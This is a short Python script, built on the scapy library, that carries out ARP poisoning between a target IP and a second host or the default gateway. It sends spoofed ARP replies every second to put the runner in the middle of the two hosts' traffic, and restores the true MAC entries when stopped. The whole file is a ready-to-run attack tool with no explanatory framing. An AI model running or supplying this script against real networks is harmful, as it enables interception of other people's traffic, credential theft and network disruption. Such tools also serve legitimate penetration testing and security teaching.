#!/usr/bin/env python

from scapy.all import Ether, ARP, srp, send, conf, getmacbyip
import argparse
import sys
import time


def poison(target1, target2, target1MAC):
    arp_reply = ARP(pdst=target1, hwdst=target1MAC, psrc=target2, op=2)
    send(arp_reply, verbose=0)


def stop_poison(target1, target2, target1MAC, target2MAC):
    arp_reply = ARP(pdst=target1, hwdst=target1MAC,
                    psrc=target2, hwsrc=target2MAC, op=2)
    send(arp_reply, verbose=0, count=4)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Enter the first target IP address")
    parser.add_argument(
        "ip2", help="Enter the second target IP address - leave blank for gateway", nargs="?")
    args = parser.parse_args()

    target1 = args.ip

    if args.ip2:
        target2 = args.ip2
    else:
        gw = conf.route.route("0.0.0.0")[2]
        target2 = gw

    try:
        target1MAC = str(getmacbyip(target1))
        target2MAC = str(getmacbyip(target2))
    except OSError:
        print("Make sure you typed the IP adresses correctly")
        sys.exit(1)

    try:
        print("ARP poisoning started")
        while True:
            poison(target1, target2, target1MAC)
            poison(target2, target1, target2MAC)
            time.sleep(1)
    except:
        print("\nFinished ARP poisoning")
        stop_poison(target1, target2, target1MAC, target2MAC)
        stop_poison(target2, target1, target2MAC, target1MAC)


if __name__ == "__main__":
    main()
